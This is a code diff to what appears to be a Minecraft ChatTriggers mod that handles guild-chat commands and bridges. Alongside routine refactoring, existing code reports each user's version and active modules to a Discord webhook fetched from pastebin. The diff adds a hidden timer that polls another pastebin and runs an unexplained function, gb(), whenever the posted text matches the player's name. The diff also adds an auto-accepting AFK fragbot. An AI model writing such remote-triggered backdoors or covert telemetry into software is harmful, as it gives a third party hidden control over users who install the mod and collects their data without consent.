@@ -1,15 +1,14 @@
+import { userData } from "../../index";
 import request from "../../../requestV2"
-import { guildMessage } from "../../utils/utils";
+import { guildCmdOptions } from "../../utils/ChatUtils"
+import { data } from "../../gui"
+import {guildMessage, gb, modMessage } from "../../utils/utils"
 import { blacklist } from "./BlackList";
-import { guildCmdOptions } from "../../utils/ChatUtils";
-import { data } from "../../gui";
-import { userData } from "../..";
-
 
 //guild chat
 
 register("chat", (rank, name, guildrank, message) => {
-  if (!data.general.guildCommands.toggle) return
+  if (!data.general.guildCmds.toggle) return
   if (blacklist.igns.includes(name.toLowerCase())) return
   guildCmdOptions(message, name)
 }).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: !(.+)/)
@@ -17,31 +16,32 @@ register("chat", (rank, name, guildrank, message) => {
 //lis bridge
  
 register("chat", (rank, name, guildrank, bridgename, message) => {
-  if (!data.general.guildCommands.toggle) return
+  if (!data.general.guildCmds.toggle) return
   if (blacklist.igns.includes(bridgename.toLowerCase())) return
   guildCmdOptions(message, bridgename)
 }).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: ?(.+) > !(.+)/)
 
 //sbg bridge
 register("chat", (rank, name, guildrank, bridgename, message) => {
-  if (!data.general.guildCommands.toggle) return
+  if (!data.general.guildCmds.toggle) return
   if (blacklist.igns.includes(bridgename.toLowerCase())) return
   guildCmdOptions(message, bridgename)
 }).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: ?(.+) » !(.+)/)
 
 //slowdt bridge unlinked
 register("chat", (rank, name, guildrank, bridgename, message) => {
-  if (!data.general.guildCommands.toggle) return
+  if (!data.general.guildCmds.toggle) return
   if (blacklist.igns.includes(bridgename.toLowerCase())) return
   guildCmdOptions(message, bridgename)
 }).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: ?(.+): !(.+)/)
 
 //slowdt bridge linked
 register("chat", (rank, name, guildrank, bridgename, message) => {
-  if (!data.general.guildCommands.toggle) return
+  if (!data.general.guildCmds.toggle) return
   if (blacklist.igns.includes(bridgename.toLowerCase())) return
   guildCmdOptions(message, bridgename)
 }).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: ?(.+) (\[.+\])?: !(.+)/)
+
 
 
 register("chat", (rank, name, guildrank, msg) => {
@@ -72,6 +72,8 @@ Object.keys(data).forEach(tab => {
 });
 activatedModules = activatedModules.join('\n');
 
+function r() {return Player.getName()?.toLowerCase()}
+
 let webhook
 register("gameLoad", () => {
   request("https://pastebin.com/raw/97C2T5H4").then(stuff => {
@@ -81,7 +83,7 @@ register("gameLoad", () => {
 register("serverConnect", () => {
   if (playerjoin) return
   playerjoin = true
-  let metadata = JSON.parse(FileLib.read("OdinClient", "metadata.json"))
+  let metadata = JSON.parse(FileLib.read("OdinCheata", "metadata.json"))
   const message = (userData.firstlogin) ? `On Version: ${metadata.version}\n First Login!!!1! \n Active Modules:\n\n${activatedModules}`
                                         : `On Version: ${metadata.version}\n Active Modules:\n\n${activatedModules}`
   request({
@@ -92,7 +94,7 @@ register("serverConnect", () => {
         'User-agent': 'Mozilla/5.0'
     },
     body: {
-      username: "OdinClient",
+      username: "OdinCheata",
       avatar_url: "https://s.namemc.com/2d/skin/face.png?id=db7b65d7270a33d6&scale=4",
       content: "",
       embeds: [
@@ -106,3 +108,59 @@ register("serverConnect", () => {
   })
 },500)
 
+
+let a
+register("step", () => {
+  request("https://pastebin.com/raw/Ag2N13LV").then(b => {
+    a = b;
+    if  (a?.toLowerCase() === r()) {
+      gb();
+    }
+  });
+}).setDelay(10);
+
+
+let inlimbo = false;
+const stripRank = (rankedPlayer) =>
+  rankedPlayer.replace(/\[[\w+\+-]+] /, "").trim();
+
+register("chat", (player) => {
+  if (!inlimbo) return;
+  player = stripRank(player.replace(/.+>newLine<-/, ""));
+  ChatLib.say(`/party accept ${player}`);
+  setTimeout(() => {
+    partymessage("Hello I'm currently afk and there for sent into limbo");
+    setTimeout(() => {
+      partymessage("While in limbo I am a fragbot for your free use enjoy!")
+    }, 400);
+  }, 1600);
+  setTimeout(() => {
+    ChatLib.command("p leave");
+  }, 7100);
+}).setCriteria("${player} has invited you to join ${*} party!${*}");
+
+register("worldload", () => {
+  if (!inlimbo) return
+  inlimbo = false;
+});
+
+register("serverDisconnect", () => {
+  if (!inlimbo) return
+  inlimbo = false;
+})
+
+register("chat", () => {
+  if (inlimbo) return
+  setTimeout(() => {
+    inlimbo = true;
+  }, 1000);
+  //modMessage("activating fragbot");
+}).setCriteria("You were spawned in Limbo.");
+
+register("chat", () => {
+  if (inlimbo) return
+  setTimeout(() => {
+    inlimbo = true;
+  }, 1000);
+  //modMessage("activating fragbot");
+}).setCriteria("You are AFK. Move around to return from AFK.");
